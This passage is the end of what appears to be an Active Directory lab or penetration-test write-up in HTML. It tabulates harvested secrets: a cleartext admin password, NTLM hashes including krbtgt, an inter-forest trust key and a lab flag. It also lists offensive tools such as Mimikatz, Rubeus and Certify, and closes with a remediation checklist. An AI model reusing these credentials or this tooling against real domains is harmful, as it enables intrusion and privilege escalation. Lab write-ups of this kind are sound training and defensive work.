+<th style="text-align: left;">Principal</th>
+<th style="text-align: left;">Type</th>
+<th style="text-align: left;">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>studentadmin</code></td>
+<td style="text-align: left;">Password</td>
+<td style="text-align: left;"><code>P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>STUDVM$</code></td>
+<td style="text-align: left;">NTLM</td>
+<td style="text-align: left;"><code>354cc671b0e734b885308de998576b0b</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>techservice</code></td>
+<td style="text-align: left;">NTLM</td>
+<td style="text-align: left;"><code>4311a88033b35fbbd00a681b005b6ead</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>TECHSRV30$</code></td>
+<td style="text-align: left;">NTLM</td>
+<td style="text-align: left;"><code>04b37fd7d28ab7c9b3cbe36336d19581</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>securetech</code> (TECHSRV30 local Admin)</td>
+<td style="text-align: left;">NTLM</td>
+<td style="text-align: left;"><code>abbd00c18b8ff34770238a08e98f4932</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>causer</code></td>
+<td style="text-align: left;">Password (LSA secret)</td>
+<td style="text-align: left;"><code>Ca@8170734525364357</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>ADMINSRV86$</code></td>
+<td style="text-align: left;">NTLM</td>
+<td style="text-align: left;"><code>390d9db95b492e45c4e43b85d2b9c432</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>tech\krbtgt</code></td>
+<td style="text-align: left;">NTLM</td>
+<td style="text-align: left;"><code>2e1b94e534db024815fdb30273174dc6</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>tech.corp ⇄ finance.corp</code> trust key</td>
+<td style="text-align: left;">RC4</td>
+<td style="text-align: left;"><code>a0ba8caa534fc2f186ca86ea7b5cee6e</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Final objective flag</strong></td>
+<td style="text-align: left;">flag</td>
+<td style="text-align: left;"><code>64061b82-fb44-48d5-b2d2-761766634e30</code></td>
+</tr>
+</tbody>
+</table>
+  <h2 id="key-domain-facts" class="in-toc numbered">Key Domain Facts</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Attribute</th>
+<th style="text-align: left;">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Domain (NetBIOS / DNS)</td>
+<td style="text-align: left;">TECH / <code>tech.corp</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">Domain SID</td>
+<td style="text-align: left;"><code>S-1-5-21-1600556212-896947471-994435180</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">Forest / Domain functional level</td>
+<td style="text-align: left;">Windows Server 2016</td>
+</tr>
+<tr>
+<td style="text-align: left;">Domain Controller</td>
+<td style="text-align: left;"><code>tech-dc.tech.corp</code> (Windows Server 2022)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Certificate Authority</td>
+<td style="text-align: left;"><code>tech-tech-dc-CA</code> (on TECH-DC)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Trusting forest</td>
+<td style="text-align: left;"><code>finance.corp</code> — SID <code>S-1-5-21-3132463012-610816204-3671931044</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>ms-DS-MachineAccountQuota</code></td>
+<td style="text-align: left;">10 (any user may join 10 computers)</td>
+</tr>
+<tr>
+<td style="text-align: left;">LAPS</td>
+<td style="text-align: left;">Not deployed (0 of 5 computers protected)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Tier-0 in Protected Users</td>
+<td style="text-align: left;">0% (<code>techadmin</code> unprotected)</td>
+</tr>
+</tbody>
+</table>
+  <h2 id="tooling" class="in-toc numbered">Tooling</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tool</th>
+<th style="text-align: left;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">adPEAS</td>
+<td style="text-align: left;">Automated domain enumeration</td>
+</tr>
+<tr>
+<td style="text-align: left;">PowerView</td>
+<td style="text-align: left;">ACL, delegation, group and trust enumeration</td>
+</tr>
+<tr>
+<td style="text-align: left;">BloodHound / SharpHound</td>
+<td style="text-align: left;">Attack-path graphing</td>
+</tr>
+<tr>
+<td style="text-align: left;">Invoke-SessionHunter</td>
+<td style="text-align: left;">Locating privileged user sessions</td>
+</tr>
+<tr>
+<td style="text-align: left;">Rubeus</td>
+<td style="text-align: left;">Kerberos ticket manipulation (asktgt, S4U, asktgs, PtT, PKINIT)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Certify</td>
+<td style="text-align: left;">AD CS enumeration and certificate abuse (ESC3)</td>
+</tr>
+<tr>
+<td style="text-align: left;">SafetyKatz / Mimikatz (evasive build)</td>
+<td style="text-align: left;">LSASS / SAM / LSA / trust-key extraction, DCSync</td>
+</tr>
+<tr>
+<td style="text-align: left;">OpenSSL</td>
+<td style="text-align: left;">PEM → PFX certificate conversion</td>
+</tr>
+</tbody>
+</table>
+  <h2 id="remediation-checklist" class="in-toc numbered">Remediation Checklist</h2>
+<ul>
+<li>[ ] Remove all cleartext credentials from scripts and file shares; restrict share ACLs.</li>
+<li>[ ] Deploy <strong>LAPS</strong> so local administrator passwords are unique per host.</li>
+<li>[ ] Audit and remove <strong>RBCD</strong> write rights (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>).</li>
+<li>[ ] Remove dangerous ACEs: self-membership on privileged groups, User-Force-Change-Password.</li>
+<li>[ ] Harden <strong>AD CS</strong>: remove the ESC3 enrollment-agent EKU, require manager approval.</li>
+<li>[ ] Add all Tier-0 accounts (e.g. <code>techadmin</code>) to <strong>Protected Users</strong>.</li>
+<li>[ ] Enforce <strong>SID filtering / quarantine</strong> on the <code>finance.corp</code> trust in both directions.</li>
+<li>[ ] Rotate the <code>krbtgt</code> password twice and the inter-realm trust key.</li>
+<li>[ ] Disable RC4 for Kerberos; require AES.</li>
+</ul>
+</section>
+</body>
+</html>
